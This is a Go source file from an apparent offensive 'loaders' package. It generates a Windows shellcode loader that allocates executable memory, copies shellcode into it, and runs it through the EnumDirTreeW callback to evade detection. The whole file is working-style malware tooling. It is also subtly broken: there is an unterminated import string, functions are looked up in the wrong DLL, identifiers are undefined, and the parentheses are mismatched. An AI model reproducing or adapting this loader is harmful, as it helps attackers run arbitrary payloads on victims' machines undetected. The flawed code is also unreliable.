package loaders

import (
	"fmt"
	"strings"
)

type EnumTreeW struct{}

func (t EnumTreeW) Import() string {
	return fmt.Sprintf(`
import (
	"fmt"
	"os"
	"syscall"
	"unsafe
)
`)
}

func (t EnumTreeW) Const() string {
	return fmt.Sprintf(`
var (
		kernel32         = syscall.MustLoadDLL("kernel32.dll")
		virtualAlloc     = kernel32.MustFindProc("VirtualAlloc")
		virtualProtect   = kernel32.MustFindProc("VirtualProtect")
	
		ntdll     = syscall.MustLoadDLL("ntdll.dll")
		rtlMove   = ntdll.MustFindProc("RtlMoveMemory")
		symInit   = ntdll.MustFindProc("SymInitialize")
		enumDir   = ntdll.MustFindProc("EnumDirTreeW")
	)
	
	const (
		MEM_COMMIT = 0x00001000
		MEM_RESERVE = 0x00002000
		PAGE_EXECUTE_READWRITE    = 0x40
	)
`)
}

func (t EnumTreeW) Init() string {
	return ""
}

func (t EnumTreeW) Process() string {
	return fmt.Sprintf(`
	address, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
		if address == 0 {
			fmt.Println("VirtualAlloc failed:", err)
			return
		}
	
		rtlMove.Call(address, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	
		var oldProtect uint32
		virtualProtect.Call(address, uintptr(len(shellcode)), pageExec, uintptr(unsafe.Pointer(&oldProtect)))
	
		symInit.Call(uintptr(getCurrentProc.Addr), 0, 1)
	
		var dummy [522]uint16
		enumDir.Call(
			uintptr(getCurrentProc.Addr), 
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:\\Windows"))), 
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("*.log"))),
			uintptr(unsafe.Pointer(&dummy[0]),
		), 0, 0)
	}
`)
}

func (t EnumTreeW) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__PROCESS__
	
}
`
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return template
}
